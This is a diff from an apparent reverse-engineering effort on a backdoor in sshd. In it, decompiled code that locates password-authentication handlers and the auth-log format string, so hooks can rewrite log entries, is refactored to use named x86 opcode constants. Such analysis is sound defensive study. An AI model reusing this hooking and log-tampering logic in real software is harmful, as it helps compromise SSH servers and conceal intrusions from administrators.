@@ -476,8 +476,9 @@ LAB_00105951:
                     probe_success = elf_vaddr_range_in_relro_if_required(search_image,(u64)mem_address,8,TRUE);
                     if ((probe_success != FALSE) &&
                        (probe_success = find_riprel_opcode_memref_ex
-                                           ((u8 *)authprobe_func_start,authprobe_func_end,(dasm_ctx_t *)0x0,0x109,
-                                            mem_address), probe_success != FALSE)) {
+                                           ((u8 *)authprobe_func_start,authprobe_func_end,(dasm_ctx_t *)0x0,
+                                            X86_OPCODE_1B_MOV_STORE,mem_address), probe_success != FALSE))
+                    {
                       authprobe_func_start = sshd_ctx_cursor->mm_answer_authpassword_start;
                       // AutoDoc: Pinpoint the shared auth-log format relocation pulled from mm_answer_* so later hooks can rewrite the literal in-place without rescanning the function.
                       ((hooks_data->global_ctx).sshd_ctx)->auth_log_fmt_reloc = (char *)mem_address;
@@ -622,7 +623,7 @@ LAB_001065af:
           if (probe_success != FALSE) break;
           syslog_bad_level_cursor = syslog_bad_level_cursor + 1;
         }
-        if ((syslog_dasm_ctx.opcode_window.opcode_window_dword & 0xfffffffd) == 0xb1) {
+        if ((syslog_dasm_ctx.opcode_window.opcode_window_dword & 0xfffffffd) == X86_OPCODE_1B_XOR_RM_R) {
           if (syslog_dasm_ctx.prefix.modrm_bytes.modrm_mod != '\x03') goto LAB_00106735;
           if ((syslog_dasm_ctx.prefix.flags_u16 & 0x1040) == 0) {
             if ((syslog_dasm_ctx.prefix.flags_u16 & 0x40) != 0) {
@@ -773,7 +774,7 @@ LAB_00106b3c:
             }
           }
         }
-        else if ((((syslog_dasm_ctx.opcode_window.opcode_window_dword == 0x147) &&
+        else if ((((syslog_dasm_ctx.opcode_window.opcode_window_dword == X86_OPCODE_1B_MOV_RM_IMM32) &&
                   ((uint)syslog_dasm_ctx.prefix.decoded.modrm >> 8 == 0x50000)) &&
                  ((syslog_dasm_ctx.prefix.flags_u16 & 0x800) != 0)) && (syslog_dasm_ctx.imm_zeroextended == 0))
         {
@@ -795,7 +796,7 @@ LAB_00106b3c:
             do {
               probe_success = find_riprel_opcode_memref_ex
                                  (scan_cursor,(u8 *)loader_data.sshd_string_refs.syslog_bad_level.func_end
-                                  ,&probe_dasm_ctx,0x147,(void *)0x0);
+                                  ,&probe_dasm_ctx,X86_OPCODE_1B_MOV_RM_IMM32,(void *)0x0);
               if (probe_success == FALSE) break;
               if ((probe_dasm_ctx.imm_zeroextended == 0) && ((probe_dasm_ctx.prefix.flags_u16 & 0x100) != 0))
               {
